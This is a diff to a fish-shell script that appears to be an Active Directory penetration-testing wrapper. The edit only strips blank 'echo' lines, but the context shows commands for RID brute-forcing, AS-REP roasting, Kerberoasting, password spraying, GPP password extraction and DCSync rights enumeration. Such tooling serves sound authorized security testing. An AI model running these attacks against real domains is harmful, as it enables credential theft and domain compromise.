@@ -354,6 +354,7 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     # User Enumeration - check if users file already exists
     set users_file "$file_domain"_users.txt
     set users_file_mini "$file_domain"_users-mini.txt
+    ezpz_header "Enumerating users with RID Bruteforcing"
     if test -f $users_file
         ezpz_info "Users file $users_file already exists. Skipping user enumeration."
         cat $users_file
@@ -363,8 +364,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         set users_temp (mktemp)
         
         # Prioritize --rid-brute over --users
-        echo
-        ezpz_header "Enumerating users with RID Bruteforcing"
         ezpz_cmd "nxc smb $nxc_auth --rid-brute 10000"
         ezpz_spin nxc smb $nxc_auth --rid-brute 10000 | grep -a 'SidTypeUser' | cut -d ':' -f2 | cut -d '\\' -f2 | cut -d ' ' -f1 | tee $users_tmp
         
@@ -381,7 +380,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
                 cp $users_file_mini $users_tmp
             else    
                 # Fallback to --users
-                echo
                 ezpz_header "Enumerating users (fallback)"
                 ezpz_cmd "nxc smb $nxc_auth --users"
                 ezpz_spin nxc smb $nxc_auth --users | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5,9- | tail -n +2 | awk '{if (NF>1) {printf "%s [", $1; for (i=2; i<=NF; i++) printf "%s%s", $i, (i<NF?" ":""); print "]"} else print $1}' | tee $users_temp
@@ -404,7 +402,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         rm -f $users_temp
     end
 
-    echo
     ezpz_header "Enumerating groups"
     ezpz_cmd "nxc ldap $nxc_auth --groups"
     set -l groups_tmp (mktemp)
@@ -444,7 +441,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No groups found (access denied?)."
     end
 
-    echo
     ezpz_header "Enumerating privileged users"
     ezpz_cmd "nxc ldap $nxc_auth --admin-count"
     set -l admins_out (ezpz_spin nxc ldap $nxc_auth --admin-count | grep -av '\[.\]' | tr -s " " | cut -d ' ' -f 5)
@@ -454,7 +450,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No privileged users found."
     end
 
-    echo
     ezpz_header "Enumerating user descriptions"
     ezpz_cmd "nxc ldap $nxc_auth -M get-desc-users"
     set -l descriptions_out (ezpz_spin nxc ldap $nxc_auth -M get-desc-users | grep -a --color=never -o "User:.*" | awk -F'description: ' '{user=$1; sub(/^User: /, "", user); print user " ||| " $2}' | column -s '|||' -t)
@@ -464,7 +459,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No user descriptions found."
     end
 
-    echo
     ezpz_header "Enumerating user info fields"
     ezpz_cmd "nxc ldap $nxc_auth -M get-info-users"
     set -l info_tmp (mktemp)
@@ -477,10 +471,8 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     end
     rm -f $info_tmp
 
-    echo
     ezpz_title "Looking for exploitable accounts..."
 
-    echo
     ezpz_header "Searching for AS-REProastable accounts"
     set asrep_file "$file_domain"_asrep.hash
     if test "$cross_domain" = true; or set -q _flag_kerb
@@ -503,7 +495,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No AS-REP roastable accounts found."
     end
 
-    echo
     ezpz_header "Searching for Kerberoastable accounts"
     set kerb_file "$file_domain"_kerb.hash
     if test "$cross_domain" = true
@@ -525,7 +516,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No Kerberoastable accounts found."
     end
 
-    echo
     ezpz_header "Searching for Timeroastable accounts"
     set time_file "$file_domain"_time.hash
     ezpz_cmd "smb $nxc_auth -M timeroast"
@@ -537,7 +527,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No Timeroastable accounts found."
     end
 
-    echo
     ezpz_header "Searching for accounts with PASSWD_NOTREQD flag"
     ezpz_cmd "nxc ldap $nxc_auth --password-not-required"
     set -l passwd_notreq_out (ezpz_spin nxc ldap $nxc_auth --password-not-required | grep --color=never -ao "User:.*")
@@ -547,7 +536,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No accounts with the PASSWD_NOTREQD flag found."
     end
 
-    echo
     ezpz_header "Enumerating Group Managed Service Accounts (gMSA)"
     ezpz_cmd "nxc ldap $nxc_auth --gmsa"
     set -l gmsa_tmp (mktemp)
@@ -569,7 +557,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
             ezpz_warn "pre2k auth does not support cross-domain auth; skipping."
             ezpz_info "Run pre2k against the credential domain DC (e.g. -t 10.10.0.11 -d north.sevenkingdoms.local)."
         else
-            echo
             ezpz_header "Searching for pre-Win2k compatible computer accounts"
 
             # Build pre2k auth command
@@ -601,7 +588,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
   
 
     if command -v kerbrute >/dev/null 2>&1
-        echo
         ezpz_header "Bruteforcing credentials with username as password"
         if test -s $users_tmp
             ezpz_cmd "kerbrute passwordspray --dc $dc_ip -d $target_domain $users_tmp --user-as-pass"
@@ -618,10 +604,8 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         ezpz_warn "Kerbrute not found. Skipping username-as-password bruteforce."
     end
 
-    echo
     ezpz_title "Looking for interesting domain configuration and services..."
 
-    echo
     ezpz_header "Searching for PKI Enrollment Services (ADCS)"
     ezpz_cmd "nxc ldap $nxc_auth -M certipy-find"
     set -l adcs_tmp (mktemp)
@@ -653,7 +637,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     end
     rm -f $adcs_tmp
 
-    echo
     ezpz_header "Searching for trust relationships"
     set -l trusts_out
     if set -q nxc_auth_ip
@@ -669,7 +652,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No trust relationships found."
     end
 
-    echo
     ezpz_header "Enumerating MachineAccountQuota (MAQ)"
     ezpz_cmd "nxc ldap $nxc_auth -M maq"
     set -l maq_out (ezpz_spin nxc ldap $nxc_auth -M maq | grep -aoE "MachineAccountQuota: .*" --color=never)
@@ -679,7 +661,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No MachineAccountQuota data found."
     end
 
-    echo
     ezpz_header "Enumerating delegation rights"
     set -l delegation_tmp (mktemp)
     if test "$cross_domain" = true
@@ -706,7 +687,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No delegation rights found."
     end
 
-    echo
     ezpz_header "Enumerating DCSync rights"
     # Build TARGET_DN dynamically based on the enumerated domain, not the
     # credential domain (cross-domain trusts would otherwise read the wrong DN).
@@ -731,7 +711,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     # (ForceChangePassword, DCSync, AddMember, GenericAll, etc.). Surface only
     # extended rights it does not model, plus GenericAll/Write as an implied
     # Reanimate-Tombstones path.
-    echo
     ezpz_header "Enumerating non-standard ACL rights"
     ezpz_cmd "nxc ldap $nxc_auth -M daclread -o TARGET_DN=<root|OU|AdminSDHolder|Deleted Objects> ACTION=read"
 
@@ -767,7 +746,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
         printf '%s\n' "No non-standard extended rights found."
     end
 
-    echo
     ezpz_header "Searching for credentials in Group Policy Preferences (GPP)"
     ezpz_cmd "nxc smb $nxc_auth -M gpp_password -M gpp_autologin"
     set -l gpp_out
@@ -782,7 +760,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     # Domain GPO user-rights assignments (GptTmpl.inf). This is a potential
     # map: the module does not evaluate GPO links/filters or local policy on
     # member servers, so treat it as leads, not effective privileges.
-    echo
     ezpz_header "Enumerating GPO-delegated user rights"
     ezpz_cmd "nxc smb $nxc_auth -M gpp_privileges"
     set -l gpp_priv_tmp (mktemp)
@@ -859,13 +836,11 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     end
     rm -f $gpp_priv_tmp
 
-    echo
     ezpz_title "Collecting domain data..."
 
     # DNS enumeration using nxc get-network (replaces bloodyAD dnsDump).
     # get-network writes its records to a timestamped log under ~/.nxc/logs
     # and prints the path; extract that path and render a hostname/IP table.
-    echo
     ezpz_header "Enumerating DNS records"
     ezpz_cmd "nxc ldap $nxc_auth -M get-network -o ALL=true"
     set -l dns_tmp (mktemp)
@@ -889,7 +864,6 @@ ezpz enumdomain -t dc01.corp.local -u CORP\\\\admin -H abc123... -d corp.local -
     end
     rm -f $dns_tmp
 
-    echo
     ezpz_header "Starting BloodHound data collection"
 
     # Keep this step quiet: nxc is extremely verbose here and none of its
